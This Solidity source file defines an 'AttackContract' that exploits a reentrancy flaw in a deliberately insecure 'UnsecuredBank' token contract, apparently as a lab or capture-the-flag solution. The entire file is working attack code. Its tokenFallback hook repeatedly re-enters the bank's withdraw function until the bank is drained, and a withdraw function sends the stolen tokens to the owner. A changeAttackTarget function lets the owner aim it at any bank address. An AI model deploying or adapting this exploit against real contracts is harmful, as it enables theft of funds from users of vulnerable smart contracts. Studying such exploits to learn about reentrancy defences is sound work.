pragma solidity ^0.4.21;

import "../unsecured/UnsecuredBank.sol";
import "../unsecured/TokenAsset.sol";
import "../unsecured/ITokenInstance.sol"; // thanks!

import "../libraries/SafeMath.sol";
import "../libraries/ReentrancyGuard.sol";
import "../libraries/Ownable.sol";

/**
 * @dev Supports attacker to steal funds from UnsecuredBank with a Reentrancy Attack
 */
contract AttackContract is ITokenInstance, Ownable, ReentrancyGuard {
    using SafeMath for uint256;

    UnsecuredBank private _targetBank;

    modifier onlyCalledByToken() {
        require(address(_targetBank.token()) == msg.sender);
        _;
    }

    function AttackContract(address bankAddress) public {
        _targetBank = UnsecuredBank(bankAddress);
    }

    function _withdrawFromBank(uint256 amount) private {
        _targetBank.withdraw(amount);
    }

    function changeAttackTarget(address newBankAddress) external onlyOwner {
        _targetBank = UnsecuredBank(newBankAddress);
    }

    function getCurrentTargetBank() public view returns (address) {
        return address(_targetBank);
    }

    /**
     * @dev Trigger the attack by exploiting the vulnerability in withdraw function of Bank contract
     */
    function triggerAttack(uint256 amount) external onlyOwner nonReentrant {
        _withdrawFromBank(amount);
    }

    /**
     * @dev Withdraw funds at the end
     */
    function withdraw() external onlyOwner nonReentrant {
        require(
            _targetBank.token().transfer(
                owner,
                _targetBank.token().balanceOf(address(this))
            )
        );
    }

    function depositToBank() external onlyOwner {
        require(_targetBank.token().balanceOf(address(this)) > 0);
        require(
            _targetBank.token().transfer(
                address(_targetBank),
                _targetBank.token().balanceOf(address(this))
            )
        );
    }

    /**
     * @dev Misuse the fallback function that originally created for depositing funds to Bank
     */
    function tokenFallback(
        address,
        uint256 amount,
        bytes
    ) external onlyCalledByToken {
        if (
            _targetBank.balanceOf(address(this)) > 0 && // omit the fist transfer from attacker to AttackContract
            !_targetBank.isComplete()
        ) {
            uint256 remainOfBank = _targetBank.token().balanceOf(
                address(_targetBank)
            );
            if (remainOfBank < amount) {
                _withdrawFromBank(amount);
            } else {
                _withdrawFromBank(remainOfBank);
            }
        }
    }
}
